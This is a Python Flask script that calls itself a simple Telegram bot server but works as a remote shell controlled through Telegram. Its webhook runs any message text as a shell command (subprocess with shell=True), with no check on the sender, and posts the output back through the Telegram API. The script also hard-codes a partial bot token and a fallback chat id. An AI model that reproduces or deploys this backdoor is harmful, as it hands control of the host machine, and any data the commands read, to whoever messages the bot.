#   A simple flask based server that interacts with Telegram Bot API
#   May 15/2020

import requests
from flask import Flask
from flask import request
from flask import Response
import json
import os
import subprocess

botToken = "1255494272:AAGxxBEViZAxjrjdNARxH7O-"     # unique telegram bot identifier token
TelegramChannals = []   # list of telegram channals the bot interacts with

app = Flask(__name__)  # Flask server initialization

with open(r'c:\tmp\res.rs','w') as res:
    res.write('...')
    res.close()
with open(r'c:\tmp\file.json','w') as ces:
    ces.close()
## experimental ##
def shell(cmd):
    if 'cd' in cmd:
        try:
            z, path = cmd.split(' ')
            try:
                os.chdir(path)
            except:
                o = 'No path named {}'.format(path)
                with open(r'c:\tmp\res.rs','w') as res:
                    res.write(o)
                    res.close()
                pass
        except:
            pass
    else:
#        pipe = os.popen(cmd, mode='r', buffering=-1)
#        out = pipe.read()
        pipi = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out= pipi.stdout.read()+pipi.stderr.read()
        with open(r'c:\tmp\res.rs','w') as res:
            res.write(str(out))
            res.close()
    return

#   a function that writes a Json file to a file that contains input from a Bot user   
def jsonWrite(data, filename = r"c:\tmp\file.json"):
    with open(filename,"w") as f:
        json.dump(data,f,indent=4,ensure_ascii=False)

### bot intereaction ####
def basicResponce(msg):
    try:
        ide = msg['message']['chat']['id']
        command = msg['message']['text']
    except:
        ide = '886347975'
        command = '...'
    if 'whoami' in command:
        l = os.getlogin()
    elif 'pwd' in command:
        l = os.getcwd()
    elif 'ls' in command:
        l = ''
        li = os.listdir()
        for stuff in li:
            if '.' in stuff:
                l = l+'\n'+stuff
            else:
                l = l+'\n['+stuff+']'
    else:
        shell(command)
        with open(r'c:\tmp\res.rs','r') as res:
            l = res.read()
    url = 'https://api.telegram.org/bot{}/sendMessage'.format(botToken)
    payload = {'chat_id':ide,'text':l}
    requests.post(url, json=payload)
    return
### bot intereaction ####

    
@app.route("/", methods=['POST','GET']) # a flask function decorator, in this caase '/' to a default index page
def index():
    if request.method == "POST":
        msg = request.get_json()
        jsonWrite(msg,r"c:\tmp\file.json")
        basicResponce(msg)
        return Response('ok', status=200) # this is like the flask telling telegram to 'chill out n stop spaming the flask(this) server, everything is ok :D'
    else:
        return "<h3>Somth Somthn</h3>" # non Bot related GET page, an html tag

if __name__ == "__main__":
	app.run(debug=True, port = 8443)
